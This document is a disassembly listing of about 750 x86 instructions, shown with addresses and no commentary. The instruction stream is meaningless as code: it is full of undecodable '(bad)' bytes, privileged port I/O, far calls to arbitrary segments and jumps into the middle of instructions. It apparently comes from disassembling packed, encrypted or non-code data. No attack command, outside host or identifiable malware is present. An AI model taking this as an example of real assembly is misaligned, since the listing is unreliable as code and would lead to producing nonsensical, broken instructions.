  40cc15:	mov    ebp,0x83dbba43
  40cc1a:	pusha  
  40cc1b:	loopne 0x40cc61
  40cc1d:	and    ecx,ebx
  40cc1f:	or     eax,0x4f5be830
  40cc24:	pop    es
  40cc25:	add    edi,DWORD PTR [edx+0x6fe9a34b]
  40cc2b:	push   edx
  40cc2c:	repnz or bl,al
  40cc2f:	xlat   BYTE PTR ds:[ebx]
  40cc30:	int    0xcb
  40cc32:	mov    ebp,0x2666d71c
  40cc37:	test   eax,0x731090aa
  40cc3c:	cld    
  40cc3d:	sub    BYTE PTR [eax+0x61],dl
  40cc40:	jae    0x40cc13
  40cc42:	(bad)  
  40cc43:	mov    BYTE PTR [ebp+0x482a862a],dh
  40cc49:	aam    0xec
  40cc4b:	ret    
  40cc4c:	pop    es
  40cc4d:	pop    ds
  40cc4e:	adc    BYTE PTR [edx],dh
  40cc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc51:	fild   WORD PTR [eax+0x68]
  40cc54:	xchg   ebp,eax
  40cc55:	sub    eax,0x75dc30b5
  40cc5a:	addr16 popf 
  40cc5c:	es call 0xa931:0xd55037c1
  40cc64:	inc    edx
  40cc65:	sbb    BYTE PTR [edi],bl
  40cc67:	ror    BYTE PTR [eax],cl
  40cc69:	jnp    0x40cc1d
  40cc6b:	sub    bl,dh
  40cc6d:	ins    BYTE PTR es:[edi],dx
  40cc6e:	jge    0x40ccd0
  40cc70:	stc    
  40cc71:	mov    ds:0xa801979d,eax
  40cc76:	cdq    
  40cc77:	pop    edi
  40cc78:	in     al,dx
  40cc79:	mov    si,0x386c
  40cc7d:	aad    0xbb
  40cc7f:	xor    BYTE PTR ss:[ecx+0x709d365],ch
  40cc86:	fdiv   QWORD PTR [ebx-0xecdd058]
  40cc8c:	dec    eax
  40cc8d:	clc    
  40cc8e:	sti    
  40cc8f:	sbb    al,0x8b
  40cc91:	(bad)  
  40cc92:	rol    dl,0x16
  40cc95:	aad    0x87
  40cc97:	push   ds
  40cc98:	xchg   ebp,eax
  40cc99:	inc    esi
  40cc9a:	lock fild DWORD PTR [ebx+0x76077766]
  40cca1:	add    edx,DWORD PTR [bx+si]
  40cca4:	fstp   QWORD PTR [esi]
  40cca6:	or     eax,0xe3c9e33f
  40ccab:	in     al,dx
  40ccac:	xchg   esp,eax
  40ccad:	hlt    
  40ccae:	xor    al,0xc
  40ccb0:	fwait
  40ccb1:	adc    al,0xb9
  40ccb3:	xor    al,BYTE PTR [esi+0x55]
  40ccb6:	sub    al,0x73
  40ccb8:	add    DWORD PTR [ebp+0x10],0xffffff84
  40ccbc:	mov    ebp,eax
  40ccbe:	sbb    BYTE PTR [ecx],0x19
  40ccc1:	dec    esp
  40ccc2:	(bad)  
  40ccc3:	in     eax,dx
  40ccc4:	xor    ebp,ebp
  40ccc6:	and    DWORD PTR [edi],0x7c345be1
  40cccc:	jmp    0x40ccf6
  40ccce:	dec    ecx
  40cccf:	xor    BYTE PTR [ebx+0x2078fd24],0xa4
  40ccd6:	ficomp WORD PTR ds:0xfe32225e
  40ccdc:	les    ebp,FWORD PTR [ecx]
  40ccde:	pop    esi
  40ccdf:	retf   0xa0c7
  40cce2:	repz fist DWORD PTR [ebx+0x3e]
  40cce6:	not    bl
  40cce8:	dec    esi
  40cce9:	cdq    
  40ccea:	sub    ebp,eax
  40ccec:	daa    
  40cced:	dec    esp
  40ccef:	sbb    eax,0x494f8aa4
  40ccf4:	loopne 0x40ccc4
  40ccf6:	loopne 0x40ccb6
  40ccf8:	imul   ebp,DWORD PTR [edx+0x3b994814],0xffffffa2
  40ccff:	pop    ds
  40cd00:	dec    ecx
  40cd01:	jb     0x40cd6e
  40cd03:	mov    edx,0x76f23027
  40cd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd09:	call   0x39d46db
  40cd0e:	jmp    0x40ccb5
  40cd10:	xchg   edx,eax
  40cd11:	xor    edx,DWORD PTR [ebx]
  40cd13:	retf   0x8cae
  40cd16:	rcl    DWORD PTR [esi],0x58
  40cd19:	repz ss push edi
  40cd1d:	push   esp
  40cd1e:	jns    0x40cd8f
  40cd20:	cli    
  40cd21:	div    BYTE PTR [ebp+0x12a9b46f]
  40cd27:	mov    edi,0x2e0ccc71
  40cd2c:	mov    edi,0x9dffb060
  40cd31:	fwait
  40cd32:	out    dx,al
  40cd33:	or     eax,0x11fb7216
  40cd38:	cmp    esi,DWORD PTR [ebp+0x510e5ccf]
  40cd3e:	scas   eax,DWORD PTR es:[edi]
  40cd3f:	mov    ebp,0xac64489c
  40cd44:	cli    
  40cd45:	in     eax,dx
  40cd46:	sbb    BYTE PTR [esi+0x3],bl
  40cd49:	test   edi,0x658821c1
  40cd4f:	into   
  40cd50:	imul   ebx,DWORD PTR [edi+edx*1-0x2],0xb
  40cd55:	add    eax,edi
  40cd57:	push   ebp
  40cd58:	sbb    BYTE PTR [ebp-0x45f49474],0xe6
  40cd5f:	and    al,0xd6
  40cd61:	cli    
  40cd62:	add    eax,0xe14fb9a4
  40cd67:	mov    WORD PTR [esi],?
  40cd69:	pop    ebx
  40cd6a:	pop    edi
  40cd6b:	out    dx,al
  40cd6c:	call   0xd872:0xc507fde2
  40cd73:	shl    dh,1
  40cd75:	arpl   cx,si
  40cd77:	je     0x40cd1d
  40cd79:	out    dx,eax
  40cd7a:	into   
  40cd7b:	fisubr WORD PTR [eax]
  40cd7d:	inc    eax
  40cd7e:	inc    eax
  40cd7f:	shl    DWORD PTR [edx+0x2e7cc8f0],0xe9
  40cd86:	lock out dx,al
  40cd88:	pop    es
  40cd89:	mov    ch,0x7a
  40cd8b:	sub    eax,0xc0e5af31
  40cd90:	jmp    0x62c952a0
  40cd95:	xor    eax,0x10c5df80
  40cd9a:	neg    BYTE PTR [ebx-0x41]
  40cd9d:	xchg   ebx,eax
  40cd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd9f:	xchg   edi,eax
  40cda0:	ja     0x40cd36
  40cda2:	xchg   edx,eax
  40cda3:	xor    DWORD PTR [edi-0x7b],ebp
  40cda6:	cli    
  40cda7:	xchg   ebx,eax
  40cda8:	mov    ch,0x99
  40cdaa:	call   0xfa8163a6
  40cdaf:	and    BYTE PTR [edi+eiz*4],al
  40cdb2:	jns    0x40cd96
  40cdb4:	sbb    bh,BYTE PTR [eax+0x129271b4]
  40cdba:	and    ah,BYTE PTR [ebp-0x2d]
  40cdbd:	fcmovnu st,st(6)
  40cdbf:	cmp    eax,esi
  40cdc1:	(bad)  
  40cdc2:	mov    edx,0x338a82de
  40cdc7:	and    esi,DWORD PTR ds:[edi]
  40cdca:	pop    ebp
  40cdcb:	in     al,0x1a
  40cdcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdce:	ins    DWORD PTR es:[edi],dx
  40cdcf:	fldcw  WORD PTR [esp+eiz*4]
  40cdd2:	xchg   esi,eax
  40cdd3:	outs   dx,BYTE PTR ds:[esi]
  40cdd4:	cmc    
  40cdd5:	je     0x40ce25
  40cdd7:	pop    ebx
  40cdd8:	daa    
  40cdd9:	push   0x5f05e37c
  40cdde:	bound  esp,QWORD PTR [ebx]
  40cde0:	sbb    DWORD PTR [ecx+ecx*8+0x262e9b56],ebx
  40cde7:	push   ebx
  40cde8:	mov    edx,0x97f27682
  40cded:	(bad)  
  40cdee:	imul   esp,DWORD PTR [esi-0x72],0x73072fe4
  40cdf5:	fistp  QWORD PTR [ecx-0x3c282e3f]
  40cdfb:	push   edi
  40cdfc:	lahf   
  40cdfd:	push   0xfd58b7f9
  40ce02:	xchg   ebx,eax
  40ce03:	sbb    eax,0x75cf7206
  40ce08:	mov    dh,0x85
  40ce0a:	pop    ds
  40ce0b:	xchg   ebx,eax
  40ce0c:	xchg   esp,eax
  40ce0d:	push   ebx
  40ce0e:	pop    ss
  40ce0f:	push   esi
  40ce10:	in     eax,dx
  40ce11:	pop    ebp
  40ce12:	sti    
  40ce13:	jp     0x40cdc0
  40ce15:	xchg   edi,eax
  40ce16:	outs   dx,BYTE PTR ds:[esi]
  40ce17:	sub    bh,ch
  40ce19:	mov    esp,0x3ab87e21
  40ce1e:	mov    al,0x57
  40ce20:	mov    dh,0xb8
  40ce22:	cmp    ecx,DWORD PTR [eax]
  40ce24:	loop   0x40ce7e
  40ce26:	mov    esp,0x251f8512
  40ce2b:	pop    eax
  40ce2c:	xor    edx,DWORD PTR [edi]
  40ce2e:	iret   
  40ce2f:	fmul   DWORD PTR [esi-0x7b]
  40ce32:	loope  0x40cdee
  40ce34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce35:	repnz mov eax,ds:0xd98c31a6
  40ce3b:	xlat   BYTE PTR ds:[ebx]
  40ce3c:	push   esi
  40ce3d:	neg    DWORD PTR [ecx-0x25]
  40ce40:	or     bl,BYTE PTR [ebp-0x6477edb0]
  40ce46:	retf   
  40ce47:	mov    al,fs:0x79423fc9
  40ce4d:	clc    
  40ce4e:	adc    al,0xa1
  40ce50:	mov    DWORD PTR [edi-0x201d819b],eax
  40ce56:	mov    al,ds:0xf5cc20f0
  40ce5b:	fld    TBYTE PTR [esi-0x19]
  40ce5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce5f:	push   0x66
  40ce61:	push   ebx
  40ce62:	dec    eax
  40ce63:	ss outs dx,DWORD PTR gs:[esi]
  40ce66:	sbb    al,0xb3
  40ce68:	aaa    
  40ce69:	sbb    BYTE PTR [eax-0xd2bf9ad],dh
  40ce6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce70:	xor    BYTE PTR [ecx-0x1082fe2c],dl
  40ce76:	inc    ebx
  40ce77:	data16 in al,dx
  40ce79:	loope  0x40ce15
  40ce7b:	mov    gs,esi
  40ce7d:	gs jae 0x40ce35
  40ce80:	cmp    al,0xe5
  40ce82:	stos   BYTE PTR es:[edi],al
  40ce83:	inc    edi
  40ce84:	in     eax,0x2c
  40ce86:	arpl   WORD PTR [esi],sp
  40ce88:	mov    esp,0xdacd87a5
  40ce8d:	test   DWORD PTR [esi],0x87df95c1
  40ce93:	mov    bl,0x9e
  40ce95:	mov    eax,0x5d0f258d
  40ce9a:	fstp   TBYTE PTR [ebx]
  40ce9c:	(bad)
  40cea0:	and    edx,DWORD PTR [eax+edx*4+0x4b8c885b]
  40cea7:	lahf   
  40cea8:	jg     0x40cec7
  40ceaa:	jmp    0xd54f:0x833da169
  40ceb1:	pusha  
  40ceb2:	jb     0x40ce59
  40ceb4:	mov    bh,BYTE PTR [ecx]
  40ceb6:	call   0xe058:0x97f1c131
  40cebd:	fist   WORD PTR [esi-0x643bc409]
  40cec3:	adc    dl,cl
  40cec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec6:	jl     0x40cf41
  40cec8:	popf   
  40cec9:	aam    0xad
  40cecb:	xchg   ecx,eax
  40cecc:	out    0x91,eax
  40cece:	cdq    
  40cecf:	and    al,BYTE PTR [ebp+0x5e]
  40ced2:	dec    edx
  40ced3:	dec    edx
  40ced4:	push   0xffffff8a
  40ced6:	mov    dh,0xfc
  40ced8:	loopne 0x40cf4a
  40ceda:	jo     0x40cf3f
  40cedc:	shl    ebp,cl
  40cede:	sahf   
  40cedf:	bound  esp,QWORD PTR [bp+di+0x572]
  40cee4:	ja     0x40cf4a
  40cee6:	lahf   
  40cee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee8:	xchg   edx,eax
  40cee9:	cmp    BYTE PTR [edi-0x19],0x70
  40ceed:	shl    BYTE PTR [esi+0x493b10ab],1
  40cef3:	sar    edi,1
  40cef5:	mov    al,BYTE PTR cs:[ebx+ecx*8-0x47c55117]
  40cefd:	int    0x5f
  40ceff:	add    DWORD PTR [edi+eiz*8+0x5ddcb2eb],0xffffffac
  40cf07:	out    0xe5,eax
  40cf09:	ss mov al,0x6b
  40cf0c:	js     0x40cedb
  40cf0e:	shl    DWORD PTR ds:0x1c225bd0,0xba
  40cf15:	pop    ds
  40cf16:	inc    edi
  40cf17:	cdq    
  40cf18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf19:	push   0x36ea9679
  40cf1e:	test   eax,0x92a0b583
  40cf23:	adc    BYTE PTR [eax],dl
  40cf25:	rol    BYTE PTR [eax+0x4e],1
  40cf28:	push   edi
  40cf29:	sub    esp,eax
  40cf2b:	xor    eax,0x15e6b99c
  40cf30:	mov    al,ds:0x7e521d15
  40cf35:	pop    ebp
  40cf36:	mov    ds:0x1e1f0f09,al
  40cf3b:	and    al,0xb8
  40cf3d:	xor    dl,BYTE PTR [esi-0x7e]
  40cf40:	ins    BYTE PTR es:[edi],dx
  40cf41:	fimul  DWORD PTR [esi]
  40cf43:	cmp    bl,dl
  40cf45:	mov    al,0xd0
  40cf47:	fcomp  QWORD PTR [edx-0x54]
  40cf4a:	lock fbld TBYTE PTR [esi+0xec052e9]
  40cf51:	clc    
  40cf52:	setg   BYTE PTR [edi+ebp*4-0x7c5d7516]
  40cf5a:	(bad)  
  40cf5b:	adc    ah,BYTE PTR [ebx-0x27]
  40cf5e:	jo     0x40cf9b
  40cf60:	xor    dl,BYTE PTR [eax]
  40cf62:	push   cs
  40cf63:	dec    ecx
  40cf64:	jle    0x40cf86
  40cf66:	fmul   DWORD PTR [ebx+0xd]
  40cf69:	jne    0x40cf7b
  40cf6b:	mov    WORD PTR [ebx],gs
  40cf6d:	ror    BYTE PTR [edx+0x5d],1
  40cf70:	jl     0x40cf0b
  40cf72:	loop   0x40cfe9
  40cf74:	rcr    al,1
  40cf76:	out    0xae,al
  40cf78:	es sbb ah,dh
  40cf7b:	xor    eax,0xb2e2a21
  40cf80:	iret   
  40cf81:	jmp    0x21b3df6d
  40cf86:	(bad)  
  40cf87:	les    ebp,FWORD PTR [ebx+esi*2+0x44]
  40cf8b:	push   cs
  40cf8c:	gs jmpw 0xee05
  40cf91:	inc    edx
  40cf92:	jmp    0x40cf15
  40cf94:	xor    DWORD PTR [ebx],0xb53068c9
  40cf9a:	push   ebx
  40cf9b:	inc    ecx
  40cf9c:	mov    edx,0x8dfc6089
  40cfa1:	sti    
  40cfa2:	pop    ss
  40cfa3:	fisubr WORD PTR [ebp+esi*1-0x1b]
  40cfa7:	test   BYTE PTR [edx-0x4a544d27],ah
  40cfad:	test   eax,0x38819a92
  40cfb2:	jg     0x40cfd1
  40cfb4:	loope  0x40cfd9
  40cfb6:	mov    WORD PTR [esi-0x3770f9ee],ss
  40cfbc:	jecxz  0x40cf84
  40cfbe:	xchg   BYTE PTR [edx+0x51],bh
  40cfc1:	enter  0x2076,0x94
  40cfc5:	loop   0x40cf98
  40cfc7:	sahf   
  40cfc8:	cwde   
  40cfc9:	mov    bl,0x4
  40cfcb:	mov    cl,0x7d
  40cfcd:	loop   0x40cfe9
  40cfcf:	ror    DWORD PTR [eax+0x4e387b5e],cl
  40cfd5:	fsub   QWORD PTR [edi-0x36d95998]
  40cfdb:	fwait
  40cfdc:	or     cl,dh
  40cfde:	ficom  DWORD PTR [ebx]
  40cfe0:	or     bh,0x70
  40cfe3:	inc    eax
  40cfe4:	push   es
  40cfe5:	loop   0x40cf6b
  40cfe7:	push   eax
  40cfe8:	and    eax,0x48800391
  40cfed:	shr    BYTE PTR [edx*8-0x4d5f6fe4],1
  40cff4:	xchg   edi,eax
  40cff5:	shl    DWORD PTR [eax],0xb4
  40cff8:	push   esp
  40cff9:	and    ah,BYTE PTR [edi+ebp*2]
  40cffc:	dec    edi
  40cffd:	mov    dl,0x41
  40cfff:	pop    ecx
  40d000:	div    BYTE PTR [edx+eax*4]
  40d003:	inc    esi
  40d004:	lods   eax,DWORD PTR ds:[esi]
  40d005:	adc    al,0x9b
  40d007:	pop    eax
  40d008:	pushf  
  40d009:	push   eax
  40d00a:	cmp    BYTE PTR [edx+0x5d],ch
  40d00d:	in     eax,dx
  40d00e:	sbb    eax,0xc08bc16a
  40d013:	mov    ?,WORD PTR [eax+0x8634f25]
  40d019:	add    eax,0xc54e5141
  40d01e:	push   es
  40d01f:	test   eax,0xf5261d90
  40d024:	(bad)  
  40d026:	and    DWORD PTR [eax],0x1a
  40d029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d02a:	je     0x40cfce
  40d02c:	xlat   BYTE PTR ds:[ebx]
  40d02d:	clc    
  40d02e:	mov    dh,0x68
  40d030:	outs   dx,BYTE PTR ds:[esi]
  40d031:	sub    al,0x82
  40d033:	inc    ebp
  40d034:	xor    DWORD PTR [edx+0x6f],esp
  40d037:	cs sbb eax,0xf97006c7
  40d03d:	mov    ds:0xb7c14984,eax
  40d042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d043:	(bad)  
  40d044:	pop    ecx
  40d045:	sub    bl,BYTE PTR [esi-0x572d8e8d]
  40d04b:	and    ebp,0xfffffffd
  40d04e:	xor    ebx,0x8defa142
  40d054:	stos   DWORD PTR es:[edi],eax
  40d055:	and    eax,0x10658ce2
  40d05a:	enter  0x2e91,0x61
  40d05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d05f:	ret    
  40d060:	and    eax,DWORD PTR [ebp-0x57da65e2]
  40d066:	test   eax,0x6a08d841
  40d06b:	call   DWORD PTR [edx+0x2b]
  40d06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d06f:	sbb    eax,0x9c158478
  40d074:	pop    ebx
  40d075:	mov    ch,0x48
  40d077:	xchg   si,ax
  40d079:	scas   eax,DWORD PTR es:[edi]
  40d07a:	in     eax,0x36
  40d07c:	add    esi,DWORD PTR [ecx+0x76]
  40d07f:	mov    edi,0xa9cf1b43
  40d084:	inc    edi
  40d085:	xor    DWORD PTR [edi+0x39],0x4ef78eb
  40d08c:	mov    bl,0x55
  40d08e:	mov    eax,DWORD PTR [esi+0x4a1ae06b]
  40d094:	cdq    
  40d095:	pop    edx
  40d096:	xchg   esp,eax
  40d097:	mov    bl,0x84
  40d099:	int    0xf
  40d09b:	clc    
  40d09c:	pop    edx
  40d09d:	ins    DWORD PTR es:[edi],dx
  40d09e:	lods   eax,DWORD PTR ds:[esi]
  40d09f:	xchg   edx,eax
  40d0a0:	add    al,0x7a
  40d0a2:	stc    
  40d0a3:	add    dl,al
  40d0a5:	sbb    DWORD PTR [ecx],edi
  40d0a7:	cdq    
  40d0a8:	mov    eax,0x8c1c717e
  40d0ad:	and    esp,DWORD PTR [ebp+0x2e]
  40d0b0:	jp     0x40d105
  40d0b2:	xor    ecx,DWORD PTR [edx+0x7e80599b]
  40d0b8:	push   edx
  40d0b9:	adc    bl,bl
  40d0bb:	test   al,0x4d
  40d0bd:	and    DWORD PTR [esi],esi
  40d0bf:	mov    cl,0x49
  40d0c1:	mov    ds:0x51c3db5a,al
  40d0c6:	adc    DWORD PTR [ebx+edx*1+0x6d54dc0a],esi
  40d0cd:	push   ecx
  40d0ce:	shl    DWORD PTR [ebx+0x2a],0x1e
  40d0d2:	mov    al,al
  40d0d4:	fnstenv [ebp+0x7f5c485b]
  40d0da:	aad    0xe5
  40d0dc:	add    BYTE PTR [eax-0x19],cl
  40d0df:	push   ecx
  40d0e0:	aad    0x67
  40d0e2:	arpl   WORD PTR [edx+0xc],di
  40d0e5:	pop    es
  40d0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0e7:	scas   eax,DWORD PTR es:[edi]
  40d0e8:	outs   dx,DWORD PTR ds:[esi]
  40d0e9:	sub    eax,0x3357d091
  40d0ee:	jb     0x40d116
  40d0f0:	dec    ecx
  40d0f1:	cld    
  40d0f2:	aam    0x3a
  40d0f4:	repz arpl WORD PTR [eax],di
  40d0f7:	dec    eax
  40d0f8:	loop   0x40d0cf
  40d0fa:	sub    cl,bl
  40d0fc:	cmp    eax,0x20203b6c
  40d101:	xor    BYTE PTR [esi],ch
  40d103:	enter  0x7974,0x76
  40d107:	aas    
  40d108:	pop    ss
  40d109:	jp     0x40d0c4
  40d10b:	fwait
  40d10c:	cmp    al,dh
  40d10e:	(bad)  
  40d10f:	cmp    bl,bl
  40d111:	cmc    
  40d112:	push   esi
  40d113:	ret    
  40d114:	inc    ecx
  40d115:	and    al,dl
  40d117:	dec    ebp
  40d118:	xor    ch,bl
  40d11a:	jns    0x40d152
  40d11c:	pop    edi
  40d11d:	xchg   esp,eax
  40d11e:	jns    0x40d155
  40d120:	cmp    cx,dx
  40d123:	xchg   ecx,eax
  40d124:	sbb    eax,DWORD PTR [edx+0x238f75a7]
  40d12a:	xchg   esi,eax
  40d12b:	mov    dh,0x18
  40d12d:	ficom  WORD PTR [eax-0x22]
  40d130:	loope  0x40d125
  40d132:	pop    edi
  40d133:	jnp    0x40d12f
  40d135:	dec    ebp
  40d136:	sub    BYTE PTR [ecx-0x54],bh
  40d139:	pop    esp
  40d13a:	scas   al,BYTE PTR es:[edi]
  40d13b:	fwait
  40d13c:	retf   0xdce3
  40d13f:	sub    BYTE PTR [ecx-0x4f],bh
  40d142:	fcomp  QWORD PTR [ebp+0x62]
  40d145:	push   ebx
  40d146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d147:	mov    ds:0xb1712a11,al
  40d14c:	in     eax,dx
  40d14d:	sub    DWORD PTR [ecx],ebx
  40d14f:	sbb    BYTE PTR [edx],bh
  40d151:	dec    esp
  40d152:	and    BYTE PTR [esi-0x6d],bl
  40d155:	lds    edx,FWORD PTR [ebx]
  40d157:	rol    DWORD PTR [eax-0x238aa95e],1
  40d15d:	xchg   esp,eax
  40d15e:	jecxz  0x40d106
  40d160:	pop    esi
  40d161:	test   eax,0xd33bc455
  40d166:	jb     0x40d12e
  40d168:	adc    BYTE PTR [ebp+0x7197cc76],al
  40d16e:	pop    ebx
  40d16f:	sub    esi,DWORD PTR [edi+0x23]
  40d172:	xchg   ecx,eax
  40d173:	fwait
  40d174:	inc    ebx
  40d175:	dec    BYTE PTR [ebx-0xc]
  40d178:	and    eax,0x981a1708
  40d17d:	leave  
  40d17e:	fild   DWORD PTR [ebx]
  40d180:	cwde   
  40d181:	adc    DWORD PTR [esi+edi*4+0x61],edx
  40d185:	ret    0x7564
  40d188:	or     BYTE PTR [esi-0x44],ah
  40d18b:	xchg   edi,eax
  40d18c:	jno    0x40d177
  40d18e:	jmp    0x7dba:0x2712b79d
  40d195:	fidiv  DWORD PTR [esi-0x4d]
  40d198:	sbb    DWORD PTR [ebx],esp
  40d19a:	fiadd  DWORD PTR [esi+esi*1]
  40d19d:	inc    esi
  40d19e:	inc    esi
  40d19f:	sub    al,0xc4
  40d1a1:	pop    esi
  40d1a2:	mov    bl,0xff
  40d1a4:	dec    BYTE PTR [edi-0x1d8cb59]
  40d1aa:	into   
  40d1ab:	add    BYTE PTR [eax-0x41],ah
  40d1ae:	jmp    0x40d175
  40d1b0:	in     eax,0x41
  40d1b2:	ja     0x40d208
  40d1b4:	or     al,0xb5
  40d1b6:	dec    edi
  40d1b7:	push   eax
  40d1b8:	imul   edi,DWORD PTR [eax-0x14],0x78
  40d1bc:	mov    dh,0x22
  40d1be:	out    dx,eax
  40d1bf:	mov    BYTE PTR [ecx+0x7b05797e],cl
  40d1c5:	rol    DWORD PTR [esi-0x4d],0x91
  40d1c9:	fistp  QWORD PTR [eax]
  40d1cb:	(bad)  
  40d1cc:	pusha  
  40d1cd:	out    0x51,al
  40d1cf:	pop    ss
  40d1d0:	sbb    DWORD PTR [edi],ebx
  40d1d2:	pop    edi
  40d1d3:	fcmovb st,st(0)
  40d1d5:	pop    edx
  40d1d6:	imul   ebp,edi,0xcc52fb40
  40d1dc:	mov    gs,WORD PTR [edx+edi*4]
  40d1df:	xchg   ecx,eax
  40d1e0:	cmp    BYTE PTR [ecx],bl
  40d1e2:	enter  0x67ce,0x1a
  40d1e6:	ficomp WORD PTR [esi-0x795cf63e]
  40d1ec:	in     al,dx
  40d1ed:	cmp    al,0xcf
  40d1ef:	(bad)  
  40d1f0:	js     0x40d270
  40d1f2:	sub    ch,BYTE PTR [eax+0x19]
  40d1f5:	sbb    DWORD PTR [eax],eax
  40d1f7:	aad    0xce
  40d1f9:	ins    DWORD PTR es:[edi],dx
  40d1fa:	js     0x40d190
  40d1fc:	adc    al,0x67
  40d1fe:	sub    al,0xdb
  40d200:	test   esi,ebx
  40d202:	ja     0x40d24e
  40d204:	jb     0x40d233
  40d206:	cmp    DWORD PTR [edi-0x7bfb6a40],ecx
  40d20c:	imul   edi,eax,0x8282eb2a
  40d212:	push   es
  40d213:	fld    TBYTE PTR [ebp+0x22124ae1]
  40d219:	jne    0x40d1e5
  40d21b:	in     eax,0x94
  40d21d:	sbb    esp,DWORD PTR [ecx]
  40d21f:	cs out dx,eax
  40d221:	dec    edi
  40d222:	pop    eax
  40d223:	mov    eax,0x743d4dba
  40d228:	std    
  40d229:	push   edi
  40d22a:	cld    
  40d22b:	ja     0x40d283
  40d22d:	jae    0x40d28f
  40d22f:	popa   
  40d230:	fistp  DWORD PTR [edx-0x12]
  40d233:	lds    ecx,FWORD PTR [esi+0x660ad4cc]
  40d239:	sbb    eax,0xd62b49e
  40d23e:	int3   
  40d23f:	std    
  40d240:	push   0x8b66bad4
  40d245:	fiadd  WORD PTR [eax]
  40d247:	fisub  DWORD PTR [esi]
  40d249:	hlt    
  40d24a:	data16 jmp 0x40d20f
  40d24d:	xor    DWORD PTR [ebp-0x6a148f89],ecx
  40d253:	aaa    
  40d254:	data16 jns 0x40d28c
  40d257:	jb     0x40d221
  40d259:	xchg   DWORD PTR [ebx+0x4a],esp
  40d25c:	dec    ebp
  40d25d:	lds    ecx,FWORD PTR [edx]
  40d25f:	pop    eax
  40d260:	jbe    0x40d283
  40d262:	in     eax,dx
  40d263:	sub    eax,0x5ac7177f
  40d268:	mov    bl,0x66
  40d26a:	push   eax
  40d26b:	push   cs
  40d26c:	shr    DWORD PTR [edi-0x2bd88d6b],0xf2
  40d273:	les    ecx,FWORD PTR ds:0x351abbd0
  40d279:	push   ebp
  40d27a:	ss push ebp
  40d27c:	ins    DWORD PTR es:[edi],dx
  40d27d:	stos   DWORD PTR es:[edi],eax
  40d27e:	or     cl,BYTE PTR [esi+0x4f]
  40d281:	shl    BYTE PTR [eax],cl
  40d283:	push   esi
  40d284:	shr    edi,0xd9
  40d287:	data16 sahf 
  40d289:	push   ds
  40d28a:	mov    ah,0xf4
  40d28c:	out    dx,al
  40d28d:	mov    dl,0xe8
  40d28f:	(bad)  
  40d291:	push   esi
  40d292:	sub    al,0x6a
  40d294:	push   esi
  40d295:	inc    edx
  40d296:	push   ebp
  40d297:	sbb    eax,0x2bff13ad
  40d29c:	jmp    0x2796489
  40d2a1:	(bad)  
  40d2a2:	aaa    
  40d2a3:	and    eax,0x50d75bef
  40d2a8:	xchg   edx,eax
  40d2a9:	pop    es
  40d2aa:	shl    eax,cl
  40d2ac:	xor    al,0x3d
  40d2ae:	jmp    0x4f39:0xdd7f832d
  40d2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2b6:	mov    ch,0x81
  40d2b8:	xchg   esi,eax
  40d2b9:	adc    DWORD PTR [esi],eax
  40d2bb:	jb     0x40d26c
  40d2bd:	mov    ch,0xa9
  40d2bf:	shl    BYTE PTR [ecx-0x39],0x8c
  40d2c3:	sti    
  40d2c4:	fwait
  40d2c5:	arpl   WORD PTR [ebx+0xa4cd8d8],bp
  40d2cb:	loop   0x40d2fd
  40d2cd:	sbb    eax,DWORD PTR [ecx]
  40d2cf:	mov    cl,0x1f
  40d2d1:	(bad)  
  40d2d2:	fmul   QWORD PTR [edx+0x78c55338]
  40d2d8:	jle    0x40d25c
  40d2da:	add    DWORD PTR [ebx-0x1d74bf2f],ecx
  40d2e0:	cli    
  40d2e1:	sub    BYTE PTR [edi+0x6b8b201b],dh
  40d2e7:	adc    edi,ecx
  40d2e9:	xlat   BYTE PTR ds:[ebx]
  40d2ea:	push   es
  40d2eb:	popf   
  40d2ec:	xchg   ebx,eax
  40d2ed:	sbb    dl,BYTE PTR [ebp-0x238c69fe]
  40d2f3:	in     eax,0xc0
  40d2f5:	dec    ecx
  40d2f6:	mov    bh,BYTE PTR [esp+esi*8+0x7a]
  40d2fa:	mov    ah,BYTE PTR ds:0xaefb94b1
  40d300:	lea    ebx,[edx]
  40d302:	push   ss
  40d303:	inc    edx
  40d304:	shr    al,0x56
  40d307:	dec    esp
  40d308:	mov    esp,0xe8d6b58d
  40d30d:	xchg   ecx,eax
  40d30e:	add    BYTE PTR [eax+edx*1+0x773694ab],bh
  40d315:	xor    al,0x32
  40d317:	mov    WORD PTR [edi+0x3e],gs
  40d31a:	jnp    0x40d38e
  40d31c:	imul   ebx,DWORD PTR [ebx],0x4876568f
  40d322:	cli    
  40d323:	sbb    DWORD PTR [ecx],0xc
  40d326:	test   DWORD PTR fs:[eax-0x74b6722f],esi
  40d32d:	lods   al,BYTE PTR ds:[esi]
  40d32e:	leave  
  40d32f:	jbe    0x40d35d
  40d331:	cmp    eax,DWORD PTR [eax]
  40d333:	add    BYTE PTR [edx],bh
  40d335:	mov    ah,0x19
  40d337:	sbb    eax,0x77474c92
  40d33c:	arpl   WORD PTR [eax+0x5de187ae],si
  40d342:	sub    eax,edx
  40d344:	leave  
  40d345:	sbb    BYTE PTR ss:[edx],cl
  40d348:	jp     0x40d375
  40d34a:	xor    BYTE PTR [edi-0x69],bh
  40d34d:	ret    
  40d34e:	sub    eax,0x3801a87
  40d353:	sub    esp,DWORD PTR [ebx-0x81562bf]
  40d359:	mov    cl,0xcb
  40d35b:	loope  0x40d374
  40d35d:	in     eax,0x10
  40d35f:	call   0xaf61:0x9fde1fbd
  40d366:	pop    ebp
  40d367:	lahf   
